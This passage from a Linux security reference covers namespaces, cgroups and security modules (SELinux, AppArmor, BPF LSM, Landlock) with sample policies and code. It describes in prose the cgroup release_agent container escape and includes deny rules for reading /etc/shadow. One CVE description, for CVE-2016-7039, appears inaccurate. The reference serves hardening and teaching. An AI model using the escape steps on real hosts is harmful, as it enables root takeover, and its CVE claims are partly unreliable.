The security relevance is direct: System V shared memory segments are a common IPC mechanism for databases (PostgreSQL uses `shmget`/`shmat`), and without IPC namespace isolation, a container could attach to shared memory segments belonging to the host's database and read or corrupt data. POSIX message queues (`mq_open`, `mq_send`, `mq_receive`) are similarly isolated. Note that POSIX shared memory (`shm_open`) uses the filesystem (`/dev/shm`) and is isolated by the mount namespace, not the IPC namespace — this distinction matters when auditing container isolation.

### 3.7 Cgroup namespace (`CLONE_NEWCGROUP`)

Virtualizes the process's view of `/proc/self/cgroup`: inside a cgroup namespace, the process sees its cgroup paths as if its own cgroup were the root. For example, a container process whose actual cgroup path on the host is `/sys/fs/cgroup/system.slice/docker-abc123.scope/` sees itself at `/` in its cgroup namespace. This prevents container processes from discovering their position in the host's cgroup hierarchy (which leaks information about the host's container orchestration structure), and critically, prevents them from writing to host cgroup files outside their own subtree.

The cgroup namespace is separate from the mount namespace isolation of the cgroup filesystem. Even if a container mounts `/sys/fs/cgroup` (which it typically does, read-only), the cgroup namespace ensures that the paths visible in that mount are relative to the container's cgroup root. Without the cgroup namespace, a container mounting the cgroup filesystem would see the host's full cgroup tree and could potentially manipulate other containers' cgroups if the mount is writable.

### 3.8 Time namespace (`CLONE_NEWTIME`, Linux 5.6+)

Allows offsetting `CLOCK_MONOTONIC` and `CLOCK_BOOTTIME` within the namespace. The offsets are stored in `struct time_namespace` and applied by the VDSO (fast userspace clock reads) and by the kernel's `clock_gettime` implementation. Used by CRIU for checkpoint/restore (the restored process sees consistent time even if the system's monotonic clock has advanced during the checkpoint interval) and by some container runtimes. Does not affect `CLOCK_REALTIME` (which is system-global and modifiable only with `CAP_SYS_TIME`).

### 3.9 Creating and entering namespaces

**`clone`/`clone3` with `CLONE_NEW*` flags:** creates a new process in a new namespace. `clone3` is the modern interface, allowing all namespace flags plus `CLONE_PIDFD` (returns a pidfd for the new process).

**`unshare(flags)`:** moves the calling process into new namespaces without creating a new process. The calling thread's `nsproxy` is replaced. Example of creating an isolated environment:

```bash
# Create new mount, PID, and network namespaces
unshare --mount --pid --fork --net bash

# Inside: mount a new /proc for the new PID namespace
mount -t proc proc /proc

# Verify isolation
hostname  # still the host's (UTS not unshared)
ip link   # only loopback (new net namespace)
```

**`setns(fd, nstype)`:** enters an existing namespace. The `fd` is an open file descriptor to `/proc/PID/ns/<type>` (e.g., `/proc/PID/ns/mnt`). This is how `nsenter` and `docker exec` work: they open the target container's namespace fds and `setns` into each one. The `nstype` argument is a `CLONE_NEW*` flag that must match the namespace type of `fd` (or 0 to allow any type).

```bash
# Enter all namespaces of PID 1234 (a container init process)
nsenter -t 1234 -m -u -i -n -p -- /bin/bash
# -m = mount, -u = UTS, -i = IPC, -n = net, -p = PID
```

**Programmatic namespace creation with `clone3`.** The `clone3` syscall (Linux 5.3+) provides a structured interface for creating processes in new namespaces:

```c
struct clone_args args = {
    .flags = CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID |
             CLONE_NEWNET | CLONE_NEWIPC | CLONE_NEWUTS,
    .pidfd = (uint64_t)&pidfd,     /* receive a pidfd for the child */
    .exit_signal = SIGCHLD,
};
pid_t child = syscall(SYS_clone3, &args, sizeof(args));
if (child == 0) {
    /* In the child: inside all new namespaces */
    /* Set up UID mapping, mount rootfs, configure network... */
}
```

The `pidfd` returned by `clone3` with `CLONE_PIDFD` provides a race-free handle to the child process, immune to PID recycling — this is the modern replacement for PID-based process management.

### 3.10 `/proc/PID/ns/` interface

Each namespace instance is represented as a pseudo-file under `/proc/PID/ns/`: `cgroup`, `ipc`, `mnt`, `net`, `pid`, `pid_for_children`, `time`, `time_for_children`, `user`, `uts`. These files are special: `stat()` on them returns the `st_ino` field as the namespace's unique identifier (inode number). Two processes in the same namespace have the same inode for that namespace file. This is how container runtimes detect namespace membership and how tools like `lsns` enumerate active namespaces on the system.

Opening a namespace file (`open("/proc/PID/ns/net", O_RDONLY)`) creates a file descriptor that keeps the namespace alive even after all processes in it have exited. This is used for "persistent namespaces" — a network namespace can be created, configured (interfaces, routes, firewall rules), and then entered later by a container process via `setns`, even if no process was initially running in it. Container networking plugins (CNI) rely on this to pre-configure network namespaces before the container process starts.

### 3.11 Namespace escape vulnerabilities

**CVE-2022-0185 (user namespace + heap overflow).** Described in §3.4 above. The fix restricted the vulnerable `fsconfig()` code path and added bounds checking on the parameter length. The broader lesson: every kernel code path reachable from within a user namespace is part of the attack surface for unprivileged local privilege escalation.

**CVE-2022-0492 (cgroup namespace escape via release_agent).** A container with `CAP_SYS_ADMIN` (e.g., a Kubernetes pod with a misconfigured securityContext) could write to the cgroup v1 `release_agent` file, which is executed by the host kernel when the last process in a cgroup exits. Because the cgroup namespace did not properly restrict access to the host's cgroup hierarchy in certain configurations, a container process could set `release_agent` to an arbitrary command and trigger its execution as root on the host. Detailed in §4.4 below.

---

## 4. Cgroups

### 4.1 Cgroups v1

Cgroups (control groups) organize processes into hierarchical groups and apply resource controllers to each group. Cgroups v1 has a separate hierarchy per controller (each mounted independently under `/sys/fs/cgroup/<controller>/`):

- **`memory`**: limits memory usage (`memory.limit_in_bytes`), tracks RSS, cache, and swap. OOM killer operates per-cgroup via `memory.oom_control`. `memory.memsw.limit_in_bytes` limits memory + swap combined. The OOM killer scores processes within the cgroup and kills the highest-scoring one; `oom_score_adj` per process can bias the selection.
- **`cpu`**: CPU time allocation via CFS shares (`cpu.shares`, relative weight) or CFS bandwidth (`cpu.cfs_period_us`, `cpu.cfs_quota_us` — hard limits on CPU time per period). Real-time scheduling control via `cpu.rt_runtime_us`.
- **`cpuset`**: pins cgroup to specific CPUs and NUMA nodes. `cpuset.cpus` and `cpuset.mems` specify allowed CPUs and memory nodes. Critical for NUMA-aware workloads and preventing noisy-neighbor effects.
- **`blkio`**: I/O bandwidth and IOPS limits per block device. Weight-based proportional allocation (`blkio.weight`) and absolute limits (`blkio.throttle.read_bps_device`).
- **`devices`**: whitelist/blacklist device access (major:minor, read/write/mknod). Critical for container security — the `devices` controller prevents containers from accessing host devices (`/dev/sda`, `/dev/mem`, etc.) even if the device nodes exist inside the container. Without this controller, a container with appropriate device nodes could read the host's disk or physical memory.
- **`freezer`**: pauses and resumes all processes in a cgroup by stopping them in an uninterruptible state. Used for checkpointing (CRIU) and for container pause functionality.
- **`pids`**: limits the number of processes (tasks) in a cgroup. `pids.max` sets the ceiling. Prevents fork bombs from consuming the host's PID space.
- **`net_cls`**, **`net_prio`**: tag network packets with a classid/priority for traffic control (`tc`).
- **`perf_event`**: per-cgroup performance monitoring via `perf_event_open`.
- **`hugetlb`**: limits huge page usage per cgroup, preventing a single container from exhausting the system's huge page pool.
- **`rdma`**: limits RDMA (Remote Direct Memory Access) resource usage per cgroup — relevant for InfiniBand and RoCE environments.

A critical operational detail of v1 is that a process can belong to different cgroups in different hierarchies simultaneously: it might be in `/docker/abc123` for the `memory` controller but `/system.slice` for the `cpu` controller. This fragmentation made v1 policies difficult to reason about holistically, which is one of the motivations for v2's unified hierarchy.

### 4.2 Cgroups v2

Cgroups v2 unifies all controllers into a single hierarchy mounted at `/sys/fs/cgroup/`. A process belongs to exactly one node in the tree, and all controllers are applied at that node. Key architectural differences from v1:

The "no internal processes" rule: a cgroup that has children cannot itself contain processes (processes must be in leaf cgroups). This simplifies resource accounting by eliminating ambiguity about how resources are distributed between a cgroup's own processes and its children.

Controllers are enabled per-subtree via `cgroup.subtree_control` rather than being implicitly active everywhere. To enable the memory controller for children of `/sys/fs/cgroup/containers/`: `echo "+memory" > /sys/fs/cgroup/containers/cgroup.subtree_control`.

The `memory` controller adds Pressure Stall Information (PSI) via `memory.pressure` — a measure of how much the cgroup's workload is being delayed by memory constraints. PSI provides `some` and `full` stall percentages over 10s, 60s, and 300s windows, enabling proactive resource management before OOM.

The `io` controller replaces `blkio` with a unified weight and bandwidth model (`io.weight`, `io.max` for absolute limits in BPS/IOPS).

The `devices` controller is replaced by eBPF-based device filtering: a BPF program attached to `BPF_CGROUP_DEVICE` evaluates device access attempts and returns allow/deny. This is more flexible than v1's whitelist and supports complex policy logic (e.g., allow access only during certain phases of a container's lifecycle).

**v1 vs v2 comparison:**

| Aspect | v1 | v2 |
|--------|----|----|
| Hierarchy | Multiple (one per controller) | Single unified |
| Process placement | Internal nodes allowed | Leaf-only |
| Controller activation | Per-hierarchy mount | `cgroup.subtree_control` |
| Device control | Static whitelist files | eBPF programs |
| Pressure monitoring | None | PSI (memory, I/O, CPU) |
| Thread-level control | Limited | `cgroup.type = threaded` |

Cgroups v2 also introduces **threaded cgroups** (`cgroup.type = threaded`), allowing individual threads of a process to be placed in different cgroups within a threaded subtree. This enables per-thread resource accounting (e.g., assigning different CPU weights to a process's worker threads and its garbage collector thread). The threaded subtree's root is the "domain threaded" cgroup, and all threaded cgroups within it share the domain cgroup's resource domain for controllers that don't support thread-level granularity (like `memory`).

**Delegation** in cgroups v2 allows non-root users to manage a subtree of the cgroup hierarchy. The root cgroup owner delegates a cgroup directory to a user by changing the ownership of `cgroup.procs`, `cgroup.threads`, `cgroup.subtree_control`, and the relevant controller interface files. The delegated user can then create child cgroups, move processes between them, and configure resource limits — all within their delegated subtree. Systemd uses delegation extensively: each user session and each systemd unit runs in its own cgroup, managed by the respective systemd instance.

### 4.3 BPF cgroup controllers

Cgroups v2 supports attaching BPF programs to cgroup hooks:

- **`BPF_CGROUP_INET_INGRESS`/`BPF_CGROUP_INET_EGRESS`**: filter inbound/outbound network packets per cgroup. Enables per-container network policy without iptables.
- **`BPF_CGROUP_INET_SOCK_CREATE`**: control socket creation (allow/deny based on socket type, protocol).
- **`BPF_CGROUP_INET4_BIND`/`BPF_CGROUP_INET6_BIND`**: control `bind()` calls (restrict which ports a cgroup can bind).
- **`BPF_CGROUP_INET4_CONNECT`/`BPF_CGROUP_INET6_CONNECT`**: control `connect()` calls (restrict which destinations a cgroup can reach).
- **`BPF_CGROUP_DEVICE`**: device access control (replacing v1 `devices` controller).
- **`BPF_CGROUP_SYSCTL`**: intercept `sysctl` reads/writes per cgroup — allows different cgroups to see different sysctl values.
- **`BPF_CGROUP_GETSOCKOPT`/`BPF_CGROUP_SETSOCKOPT`**: intercept socket option operations.

These BPF programs run in the kernel's BPF virtual machine and can make policy decisions based on the cgroup context, process credentials, and operation parameters. They are the modern replacement for static configuration files and provide container runtimes with fine-grained, programmable policy.

### 4.4 Cgroup security: escape attacks and hardening

Cgroups are the resource-isolation layer of containers. Without them, a container process can consume arbitrary CPU, memory, I/O, and PIDs, starving the host and other containers. The `devices` controller (v1) or BPF device filter (v2) is the authorization layer for device access — without it, a container with `/dev/sda` visible could read the host's disk.

**CVE-2022-0492 — `release_agent` escape.** In cgroups v1, each cgroup hierarchy has a `release_agent` file at the root: a path to an executable that the kernel runs (as root, in the host's namespaces) when the last process in any cgroup exits and the cgroup has `notify_on_release` set. The escape works as follows: a container process with `CAP_SYS_ADMIN` mounts a cgroup v1 filesystem (possible because `CAP_SYS_ADMIN` allows `mount`), creates a child cgroup, writes the path to a host-accessible script into `release_agent`, enables `notify_on_release`, places a process in the child cgroup and then exits it. The kernel executes the `release_agent` script as root on the host. The fix required that `release_agent` can only be set by a process in the initial (root) cgroup namespace, and that the process has `CAP_SYS_ADMIN` in the init user namespace (not just within its own namespace).

**CVE-2022-23222 — eBPF type confusion.** A vulnerability in the BPF verifier allowed type confusion on pointer arithmetic, leading to arbitrary kernel read/write. While not specific to cgroups, this was exploitable from within containers because `CAP_BPF` or `CAP_SYS_ADMIN` within a user namespace was sufficient to load BPF programs in affected kernel versions (before unprivileged BPF loading was disabled by default with `kernel.unprivileged_bpf_disabled = 1`).

**Docker/Kubernetes cgroup hardening.** Docker translates `--memory`, `--cpus`, `--pids-limit` flags into cgroup limits:

```bash
# Docker: 512MB memory limit, 1.5 CPUs, max 100 processes
docker run --memory=512m --cpus=1.5 --pids-limit=100 myimage
```

In Kubernetes, resource limits are set via the pod spec and enforced via cgroups:

```yaml
resources:
  limits:
    memory: "512Mi"
    cpu: "1500m"
  requests:
    memory: "256Mi"
    cpu: "500m"
```

The `LimitRange` and `ResourceQuota` admission controllers enforce that all pods specify resource limits, preventing unbounded cgroups. A pod without resource limits runs in the host's root cgroup (or in a cgroup without constraints), which means a memory leak or fork bomb in that pod can starve the kubelet and other system components.

### 4.5 Cgroup-based denial-of-service and hardening

Even with cgroup limits configured, several denial-of-service vectors remain:

**CPU starvation.** A container that consumes its full CPU quota does not affect other containers (CFS bandwidth throttling is hard). However, kernel threads running on behalf of the container (e.g., softirqs for network I/O, block I/O completion threads) may not be properly accounted to the container's cgroup, allowing indirect CPU consumption on the host. The `cpu.stat` file in cgroups v2 exposes `throttled_usec` for monitoring.

**Memory pressure cascading.** When a container hits its memory limit, the kernel's per-cgroup OOM killer activates. However, the reclaim process itself (scanning page lists, shrinking slab caches) consumes CPU and can cause latency spikes for other containers sharing the same NUMA node. Memory pressure is best monitored via PSI (`memory.pressure` in cgroups v2) rather than waiting for OOM events.

**PID exhaustion.** Without `pids.max` limits, a container can fork-bomb until the kernel's global PID limit (`kernel.pid_max`) is reached, preventing any new process creation system-wide. Docker sets `pids.max` via `--pids-limit`; Kubernetes uses the `PodPidsLimit` feature gate.

**Device access.** The `devices` controller (v1) or `BPF_CGROUP_DEVICE` (v2) is the last line of defense against device access. Without it, a container that can `mknod` a device node for `/dev/sda` (if `CAP_MKNOD` is held) can read the host's disk. The defense chain is: deny `CAP_MKNOD` (or deny `CAP_SYS_ADMIN` which implies it), enforce device cgroup policy, and mount `/dev` as a minimal `tmpfs` with only allowed devices.

---

## 5. Linux Security Modules

### 5.1 The LSM framework

The LSM (Linux Security Module) framework provides hook points throughout the kernel where security modules can intercept operations and enforce policy. There are approximately 200 hooks (`security_*` functions defined via macros in `include/linux/lsm_hooks.h` and `include/linux/lsm_hook_defs.h`), covering file access, inode creation, socket operations, task creation, capability checks, IPC, and more.

**Hook insertion points** are placed at critical decision boundaries in kernel subsystems:

- **VFS layer:** `security_inode_permission` (before every file access), `security_inode_create`, `security_inode_link`, `security_inode_unlink`, `security_inode_mkdir`, `security_file_open`, `security_file_mmap`, `security_file_mprotect`. These enforce MAC policy on all filesystem operations.
- **Network:** `security_socket_create`, `security_socket_bind`, `security_socket_connect`, `security_socket_listen`, `security_socket_accept`, `security_socket_sendmsg`, `security_socket_recvmsg`, `security_sk_alloc`. These enforce network access control (e.g., SELinux's network object classes).
- **Task/process:** `security_task_create`, `security_task_alloc`, `security_task_kill`, `security_task_setrlimit`, `security_bprm_check` (during `execve`). These enforce process creation and signal delivery policy.
- **IPC:** `security_msg_queue_msgsnd`, `security_shm_shmctl`, `security_sem_semop`. These enforce IPC access control.
- **Capability:** `security_capable` — allows the LSM to override or restrict capability checks beyond the standard kernel logic.

Each hook receives context about the operation (the target inode, the requesting credentials, the operation type) and returns either 0 (allow) or a negative errno (deny). Multiple LSMs can be stacked: a "major" LSM (SELinux or AppArmor, mutually exclusive historically but stackable since Linux 5.1 via the `lsm=` boot parameter) plus "minor" LSMs (Yama, LoadPin, Lockdown, Landlock, BPF LSM) that each process a subset of hooks.

**Security blobs.** Each LSM needs to attach per-object security state (e.g., SELinux stores a security context string on every inode). The framework uses `security_blob_sizes` to allocate space in kernel structures. Each `struct inode`, `struct file`, `struct task_struct`, `struct cred`, `struct superblock`, and `struct socket` contains a `void *security` pointer (or, with LSM stacking, a blob large enough for all active LSMs). The LSM framework manages allocation and ensures each LSM gets its own slice of the blob.

The LSM framework uses a static call mechanism (since Linux 5.x) for performance: each hook is a direct function call rather than an indirect call through a function pointer table, avoiding the overhead and the Spectre-v2 concerns of indirect branches. The boot parameter `lsm=` controls the order and selection of active LSMs: `lsm=lockdown,yama,landlock,apparmor` enables those four in that order. The order matters because hooks are called in registration order, and each hook's return value is combined: for most hooks, any deny overrides all allows (logical AND — the most restrictive result wins).

The LSM framework also provides the `security_add_hooks()` function for LSM registration, which populates the static call slots. An LSM that does not implement a particular hook simply leaves that slot empty (it defaults to allow). This means that stacking multiple minor LSMs has minimal overhead for hooks where only one LSM participates — there is no iteration over empty entries.

### 5.2 SELinux

SELinux (Security-Enhanced Linux) is a mandatory access control (MAC) system originally developed by the NSA. It enforces policy based on security labels attached to every object (files, processes, sockets, IPC objects) in the system. Every kernel object carries a security context (also called a label), which is a string of the form `user:role:type:level` (e.g., `system_u:system_r:httpd_t:s0`).

**Type Enforcement (TE).** The core mechanism. Every process runs in a "domain" (a type label, e.g., `httpd_t`), and every object has a "type" label (e.g., `httpd_content_t`). Policy rules specify which domains can perform which operations on which types. Anything not explicitly allowed is denied (default-deny).

A minimal `.te` (type enforcement) policy module:

```
policy_module(mywebapp, 1.0.0)

# Declare types
type mywebapp_t;     # process domain
type mywebapp_exec_t; # executable type
type mywebapp_data_t;  # data files

# Domain transition: init_t executes mywebapp_exec_t → enters mywebapp_t
type_transition init_t mywebapp_exec_t:process mywebapp_t;

# Allow the transition
allow init_t mywebapp_exec_t:file { read execute open getattr };
allow init_t mywebapp_t:process transition;

# Allow mywebapp_t to operate
allow mywebapp_t mywebapp_data_t:file { read write open create getattr };
allow mywebapp_t mywebapp_data_t:dir { read search open getattr };
allow mywebapp_t self:tcp_socket { create connect write read };

# Deny rule (compile-time assertion — if any other module allows this, compilation fails)
neverallow mywebapp_t shadow_t:file { read write };
```

Domains transition on `execve`: if a process in domain `init_t` executes a binary labeled `mywebapp_exec_t`, and a `type_transition` rule exists, the new process runs in `mywebapp_t`. The `allow` rule for the transition must also exist. This is how SELinux confines services: each service's binary has a distinct label, and exec transitions into a confined domain.

**File contexts and labeling.** File context definitions (`.fc` files) map filesystem paths to labels using regular expressions: `/var/www(/.*)?  system_u:object_r:httpd_content_t:s0`. The `restorecon` command applies these definitions to the actual filesystem, setting the `security.selinux` extended attribute. `semanage fcontext` manages custom file context definitions.

**MLS (Multi-Level Security).** Optional layer that enforces hierarchical sensitivity levels (e.g., `s0` through `s15`) and the Bell-LaPadula model: no read up (a `s0` process cannot read `s3` data), no write down (a `s3` process cannot write to `s0` files — preventing information leakage to lower levels). Used in government/military deployments. Processes and objects carry sensitivity labels; the kernel enforces the dominance relation between labels.

**MCS (Multi-Category Security).** A simplified version of MLS using categories rather than levels. Each object and process can be tagged with a set of categories (e.g., `c0`, `c1`, ..., `c1023`). Access is granted only if the process's category set is a superset of the object's. Used by container runtimes: OpenShift assigns each container a unique MCS category pair (e.g., `s0:c12,c34`), so one container's files are inaccessible to another even though they share the same TE domain (`container_t`). This is per-container isolation within a shared MAC policy.

**Policy management tools:**

- `checkpolicy` — compile policy source to binary.
- `semodule -i module.pp` — install a compiled policy module.
- `sesearch -A -s httpd_t -t httpd_content_t` — query allow rules for a source-target pair.
- `seinfo -t` — list all types defined in the loaded policy.
- `semanage` — manage policy components (file contexts, ports, booleans, users).
- `restorecon -Rv /path` — recursively relabel files to match file context definitions.

**Troubleshooting AVC denials:** When SELinux denies an operation, it logs an AVC (Access Vector Cache) denial to the audit log:

```
type=AVC msg=audit(1234567890.123:456): avc:  denied  { read } for
  pid=5678 comm="mywebapp" name="config.json" dev="sda1" ino=789012
  scontext=system_u:system_r:mywebapp_t:s0
  tcontext=system_u:object_r:etc_t:s0 tclass=file permissive=0
```

The `audit2allow` tool reads AVC denials and generates policy rules to allow the denied operations: `audit2allow -i /var/log/audit/audit.log -M mypolicy`. The `sealert` tool (from `setroubleshoot`) provides human-readable explanations of denials. The workflow for policy development is: set the domain to permissive (`semanage permissive -a mywebapp_t`), exercise the application, collect denials, generate and review rules with `audit2allow`, install the module, and switch to enforcing.

**SELinux bypass CVEs.** CVE-2016-7039 affected SELinux's handling of certain socket operations where the label check was applied to the wrong security context, allowing a confined process to send network traffic as if it were unconfined. CVE-2021-33909 ("Sequoia") was a kernel vulnerability in the filesystem layer where a long path name caused an integer overflow in `seq_file`, leading to out-of-bounds writes — exploitable to overwrite the `cred` structure and change the SELinux context to `unconfined_t`, effectively bypassing all SELinux policy. The broader pattern is that SELinux policy is only as strong as the kernel's correctness: a kernel memory corruption vulnerability that allows overwriting `struct cred` (or the `security` blob attached to it) can change a process's security context to `unconfined_t` or any other label, rendering the entire SELinux policy moot. This is why kernel hardening (KASAN, KFENCE, stack protector, CFI) and SELinux are complementary rather than redundant: SELinux prevents misuse of legitimate kernel interfaces, while kernel hardening prevents exploitation of implementation bugs that could bypass SELinux.

**SELinux booleans** provide runtime-tunable policy switches without recompiling the policy. For example, `httpd_can_network_connect` (default: off) controls whether the `httpd_t` domain can make outgoing TCP connections. Setting it on (`setsebool -P httpd_can_network_connect 1`) adds allow rules for the `httpd_t` domain to connect to arbitrary network ports. There are hundreds of booleans in the reference policy, and they are a frequent source of misconfigurations: an administrator who enables a boolean to make an application work may inadvertently weaken the policy in ways they don't understand.

### 5.3 AppArmor

AppArmor is a path-based MAC system. Where SELinux labels objects, AppArmor uses filesystem paths to specify access. A profile for a program lists the paths it can access and the permissions for each:

```
#include <tunables/global>

/usr/sbin/nginx {
    #include <abstractions/base>
    #include <abstractions/nameservice>

    # File access rules
    /etc/nginx/** r,
    /var/log/nginx/** w,
    /var/www/** r,
    /run/nginx.pid rw,
    /etc/ssl/private/** r,

    # Network rules
    network inet tcp,
    network inet udp,
    network inet6 tcp,

    # Capability rules
    capability net_bind_service,
    capability setuid,
    capability setgid,
    capability dac_override,

    # Deny rules (explicit, logged)
    deny /etc/shadow r,
    deny /root/** rwx,

    # Child profile (hat) for CGI scripts
    ^cgi {
        /usr/lib/cgi-bin/** rix,
        /var/www/cgi-data/** rw,
        deny network,
    }
}
```

**Profile modes**: `enforce` (deny and log violations), `complain` (log but allow — useful for policy development), and `unconfined` (no restrictions, the profile is loaded but not active). Modes are set per-profile:

```bash
# Set a profile to complain mode
aa-complain /usr/sbin/nginx

# Set to enforce mode
aa-enforce /usr/sbin/nginx

# Check status of all profiles
aa-status
```

**`change_hat`**: a mechanism allowing a program to transition to a more restricted sub-profile ("hat") at runtime. Used by Apache's `mod_apparmor` to confine individual virtual hosts: the main process runs in the base profile, and each request handler calls `change_hat` to enter a per-vhost sub-profile. The transition requires a magic token (shared secret) to prevent arbitrary hat changes; the process must hold the token to switch hats. `change_hat` can only restrict further (the hat's permissions are a subset of the parent profile's).

**Profile development tools:**

- `aa-genprof` — interactive profile generation. Runs the target application, monitors denials, and prompts the user to allow or deny each access, building a profile incrementally.
- `aa-logprof` — scans the system log for AppArmor events and suggests profile updates. Used after running an application in complain mode.
- `aa-autodep` — creates a minimal skeleton profile for an executable.

**Profile stacking** (Linux 5.1+): a process can be confined by multiple profiles simultaneously. Each access must be allowed by all profiles. Used when combining distribution profiles with runtime-specific profiles (e.g., Docker's AppArmor profile stacked with the distribution's profile for the same binary). The stacked confinement is the intersection of all active profiles.

**SELinux vs AppArmor comparison:**

| Aspect | SELinux | AppArmor |
|--------|---------|----------|
| Access control model | Label-based (inode labels) | Path-based (filesystem paths) |
| Policy scope | System-wide, all objects labeled | Per-program profiles |
| Hard links | Labels follow inode — consistent | Different paths = possibly different rules |
| MLS/MCS | Full support | Not supported |
| Policy complexity | High (full-system policy) | Lower (per-application) |
| Default distro | RHEL, Fedora, CentOS | Ubuntu, SUSE, Debian |
| Profile development | `audit2allow` from AVC logs | `aa-genprof` interactive |
| Stacking | Supported since 5.1 | Supported since 5.1 |

AppArmor's path-based model is simpler to understand and deploy than SELinux's label-based model, but has a fundamental limitation: if a file is reachable via multiple paths (hard links, bind mounts, symlinks), the policy may not cover all access vectors. SELinux's label model doesn't have this problem because the label follows the inode, not the path.

### 5.4 Smack

Smack (Simplified Mandatory Access Control Kernel) is a simpler MAC system: each process and object carries a text label (up to 255 characters). Access rules are simple subject-object-permission triples written to `/smack/load2`: `subject object rwxatl` (read, write, execute, append, transmit, lock). The default policy is deny-all unless a rule explicitly grants access. Special built-in labels include `_` (floor — globally readable), `^` (hat — globally readable/writable), and `*` (star — read-only by everyone).

Smack's simplicity is its design goal: where SELinux requires a multi-file policy compiled into a binary blob, and AppArmor requires per-application profiles, Smack rules are one-line ASCII entries. This makes Smack suitable for embedded and IoT systems (Tizen OS uses Smack as its primary MAC mechanism) where policy management resources are limited and the access patterns are well-defined. Smack also supports "onlycap" mode where only processes with specific labels can exercise certain capabilities, providing a coarse-grained capability restriction layer on top of the standard capability system.

### 5.5 TOMOYO

TOMOYO Linux is a pathname-based MAC system similar to AppArmor but with a learning mode that automatically generates policy by observing a system's normal operation. Policy is organized around "domains" — execution contexts defined by the process's executable path chain (e.g., `<kernel> /sbin/init /usr/sbin/sshd /bin/bash`). This path chain provides execution history context that AppArmor lacks: the same binary confined differently depending on how it was reached. TOMOYO's learning mode records all operations the system performs during normal operation and generates a policy that allows exactly those operations. The administrator then switches to enforcing mode, and any operation not seen during the learning phase is denied. This is effective for static workloads (servers with predictable behavior) but fragile for dynamic environments. Less common in enterprise environments; used in some Japanese government and enterprise deployments.

### 5.6 eBPF LSM

Since Linux 5.7, BPF programs can attach to LSM hooks (`BPF_PROG_TYPE_LSM`). A BPF LSM program receives the same arguments as a traditional LSM hook and returns 0 (allow) or negative errno (deny). The attachment is made via `bpf_trampoline` — a dynamically-generated trampoline function that calls the BPF program before or after the original LSM hook.

A skeleton example attaching to the `file_open` hook to deny opening files in `/tmp/secret/`:

```c
SEC("lsm/file_open")
int BPF_PROG(deny_secret_open, struct file *file)
{
    char path_buf[256];
    int ret;

    ret = bpf_d_path(&file->f_path, path_buf, sizeof(path_buf));
    if (ret < 0)
        return 0;  /* allow on error — fail-open for robustness */

    /* Check if the path starts with /tmp/secret/ */
    const char prefix[] = "/tmp/secret/";
    for (int i = 0; i < sizeof(prefix) - 1; i++) {
        if (path_buf[i] != prefix[i])
            return 0;  /* no match, allow */
    }

    return -EACCES;  /* deny */
}
```

Advantages over traditional LSMs: BPF LSM programs can be loaded and unloaded dynamically (no recompile/reboot), can use BPF maps for stateful policy decisions (e.g., maintaining a deny-list of file hashes), can collect metrics, and can be combined with other BPF programs (network, tracing). They integrate with the BPF CO-RE (Compile Once, Run Everywhere) ecosystem for kernel-version portability.

Disadvantages: BPF programs are limited in complexity (bounded loops, restricted function calls, verifier constraints), and the BPF LSM hook coverage is not as comprehensive as SELinux or AppArmor (not all ~200 hooks have BPF attachments, though coverage is expanding with each kernel release).

BPF LSM is used by runtime security tools: **Cilium Tetragon** uses BPF LSM + kprobes + tracepoints for security observability and enforcement (file access monitoring, network policy, process execution control). **Tracee** (Aqua Security) and **Falco** (Sysdig) use BPF programs for detection, and increasingly for enforcement via BPF LSM hooks. The advantage of BPF LSM over kprobe-based approaches is that BPF LSM hooks are stable kernel interfaces (they won't break across kernel versions), while kprobe attachment points can change.

BPF LSM programs are loaded with `bpf(BPF_PROG_LOAD)` with type `BPF_PROG_TYPE_LSM` and attach type `BPF_LSM_MAC`. They attach to a specific LSM hook by name (the BTF type ID of the hook function). The BPF verifier ensures the program is safe: bounded execution time, no unbounded memory access, correct return type. BPF maps (hash maps, arrays, ring buffers) provide persistent state between invocations — a BPF LSM program can maintain a deny-list of file hashes, a counter of denied operations per process, or a log of security-relevant events pushed to userspace via `BPF_MAP_TYPE_RINGBUF`.

### 5.7 Landlock

Landlock (Linux 5.13+) is an unprivileged access-control mechanism. Unlike SELinux, AppArmor, and BPF LSM (which require root or admin capability to install policy), Landlock allows any process to restrict its own access — sandboxing itself. No `CAP_SYS_ADMIN` or special privilege is required.

A process creates a Landlock ruleset, adds rules to it, and then enforces it. After enforcement, the process can only perform operations allowed by the ruleset. The restriction is inherited across `fork` and `exec` and can only be tightened, never loosened.

C code example:

```c
#include <linux/landlock.h>
#include <sys/syscall.h>

/* Define the handled access rights for filesystem */
struct landlock_ruleset_attr ruleset_attr = {
    .handled_access_fs =
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_WRITE_FILE |
        LANDLOCK_ACCESS_FS_EXECUTE,
};

/* Create the ruleset */
int ruleset_fd = syscall(SYS_landlock_create_ruleset,
    &ruleset_attr, sizeof(ruleset_attr), 0);

/* Add a rule: allow reading from /usr */
struct landlock_path_beneath_attr path_beneath = {
    .allowed_access = LANDLOCK_ACCESS_FS_READ_FILE |
                      LANDLOCK_ACCESS_FS_EXECUTE,
    .parent_fd = open("/usr", O_PATH | O_CLOEXEC),
};
syscall(SYS_landlock_add_rule, ruleset_fd,
    LANDLOCK_RULE_PATH_BENEATH, &path_beneath, 0);
close(path_beneath.parent_fd);

/* Add a rule: allow read/write in /tmp */
path_beneath.allowed_access = LANDLOCK_ACCESS_FS_READ_FILE |
                              LANDLOCK_ACCESS_FS_WRITE_FILE;
path_beneath.parent_fd = open("/tmp", O_PATH | O_CLOEXEC);
syscall(SYS_landlock_add_rule, ruleset_fd,
    LANDLOCK_RULE_PATH_BENEATH, &path_beneath, 0);
close(path_beneath.parent_fd);

/* Enforce the ruleset — no going back */
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);  /* required */
syscall(SYS_landlock_restrict_self, ruleset_fd, 0);
close(ruleset_fd);

/* Now this process can only:
   - Read/execute files under /usr
   - Read/write files under /tmp
   - All other filesystem access is denied */
```

Landlock currently supports filesystem access control (controlling which paths can be read, written, executed, truncated, referred-to, etc.) and network access control (Linux 6.3+, controlling which TCP ports can be bound or connected to via `LANDLOCK_RULE_NET_PORT`).

Landlock fills the gap between seccomp (which filters syscalls by number/arguments but cannot express path-based file access policy) and LSMs (which require admin privilege to configure). A web browser can use Landlock to restrict its renderer process to only the paths it needs, without requiring any system-wide policy. Chromium and Firefox are adopting Landlock for content process sandboxing on Linux.

